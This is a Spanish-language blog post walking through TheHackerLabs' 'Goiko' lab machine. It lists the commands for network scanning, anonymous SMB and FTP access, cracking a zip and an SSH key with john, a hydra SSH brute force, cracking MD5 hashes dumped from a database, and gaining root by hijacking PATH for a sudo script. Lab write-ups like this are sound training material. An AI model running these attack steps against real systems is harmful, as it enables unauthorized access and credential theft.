@@ -1,0 +1,173 @@
+---
+layout: post
+title: "Goiko"
+date: 2024-06-22 11:55:23
+category: sample
+vm: hackerlabs
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Goiko </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://thehackerslabs.com/goiko/" target="_blank"> Descarga</a></strong></td> </tr>
+</table>
+
+<br>
+
+
+![img](/notas/public/img/thehackerlabs/Goiko/host.png){:.margin}
+
+**1\.** Escaneando la red para ver los hosts activos.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![img](/notas/public/img/thehackerlabs/Goiko/arp.png){:.margin}
+
+**2\.** Escaneo los puertos y servicios del host objetivo.
+
+`sudo nmap -p- --open -T5 --min-rate=5000 -sCV -n -Pn 192.168.1.9`
+
+![img](/notas/public/img/thehackerlabs/Goiko/nmap.png){:.margin}
+
+**3\.** Ya que no tenemos mas, y menos credenciales, listo los archivos compartidos.
+
+`smbclient -L //192.168.1.9/ -N`
+
+![img](/notas/public/img/thehackerlabs/Goiko/smbclientL.png){:.margin}
+
+**4\.** Veo los recursos en cada carpeta, en una de ellas encuentro credenciales.
+
+`smbclient //192.168.1.9/menu -N`
+
+`get \.cafesinleche`
+
+`cat ./\\.cafesinleche || cat ./.cafesinleche`
+
+![img](/notas/public/img/thehackerlabs/Goiko/cafesinleche.png){:.margin}
+
+**5\.** Accedo por ssh pero no encuentro nada, mas que saber los usuarios de la maquina.
+
+`ssh marmai@192.168.1.9`
+
+`cat /etc/passwd | grep bash`
+
+![img](/notas/public/img/thehackerlabs/Goiko/users.png){:.margin}
+
+**6\.** Accedo por ftp, donde encuentro un comprimo y me lo descargo.
+
+`ftp 192.168.1.9 -p 10021`
+
+`dir`
+
+`get BurgerWithoutCheese.zip`
+
+![img](/notas/public/img/thehackerlabs/Goiko/zip.png){:.margin}
+
+**7\.** Necesito una clave para descomprimir, procedo a crackear la contraseña.
+
+`zip2john BurgerWithoutCheese.zip > keyzip`
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt keyzip`
+
+![img](/notas/public/img/thehackerlabs/Goiko/zipkey.png){:.margin}
+
+**8\.** Descomprimo y me da una lista de usuarios y una idrsa cifrada.
+
+`unzip BurgerWithoutCheese.zip`
+
+`cat users`
+
+`cat id_rsa`
+
+![img](/notas/public/img/thehackerlabs/Goiko/zipfiles.png){:.margin}
+
+**9\.** Crackeando la contraseña del id_rsa.
+
+`ssh2john id_rsa > key`
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt key`
+
+![img](/notas/public/img/thehackerlabs/Goiko/idrsakey.png){:.margin}
+
+**10\.** Haciendo fuerza bruta al ssh.
+
+`hydra -L users -p "babygirl" ssh://192.168.1.9`
+
+![img](/notas/public/img/thehackerlabs/Goiko/hydra.png){:.margin}
+
+**11\.** Accedo por ssh como gurpreet y encuentro una nota.
+
+`ssh gurpreet@192.168.1.9`
+
+`cat nota`
+
+![img](/notas/public/img/thehackerlabs/Goiko/sshgurpreet.png){:.margin}
+![img](/notas/public/img/thehackerlabs/Goiko/gurpreetfiles.png){:.margin}
+
+**12\.** Accedo a la base de datos, encuentro credenciales.
+
+`mariadb -u gurpreet -p`
+
+`show databases;`
+
+`use secta;`
+
+`show tables;`
+
+`select * from integrantes;`
+
+![img](/notas/public/img/thehackerlabs/Goiko/mariadb.png){:.margin}
+
+**13\.** Crackeando los hashes en md5.
+
+`nano hashes`
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=RAW-MD5`
+
+![img](/notas/public/img/thehackerlabs/Goiko/johnhashes.png){:.margin}
+
+**14\.** Migro al usuario nika, veo que puedo ejecutar un script bash como root.
+
+`su nika`
+
+`sudo -l`
+
+![img](/notas/public/img/thehackerlabs/Goiko/sudol.png){:.margin}
+
+**15\.** Escalando privilegios a superusuario.
+
+_15.1- Veo que el script ejecuta el comando find pero sin especificar su ruta_
+
+`cat /opt/porno/watchporn.sh`
+
+![img](/notas/public/img/thehackerlabs/Goiko/watchporn.png){:.margin}
+
+_15.2- Voy a mi directorio de usuario y creo un find alternativo que ejecute una bash_
+
+`cd`
+
+`echo "/bin/bash" > find`
+
+`chmod 777 find`
+
+![img](/notas/public/img/thehackerlabs/Goiko/find.png){:.margin}
+_15.3- Por ultimo ejecuto el script indicando nuestro PATH temporalmente, y obtenemos el usuario root_
+
+`sudo PATH=/home/nika:$PATH /opt/porno/watchporno.sh`
+
+![img](/notas/public/img/thehackerlabs/Goiko/root.png){:.margin}
+
+<br>
+
+<span class="finish">_Finalizado._</span>
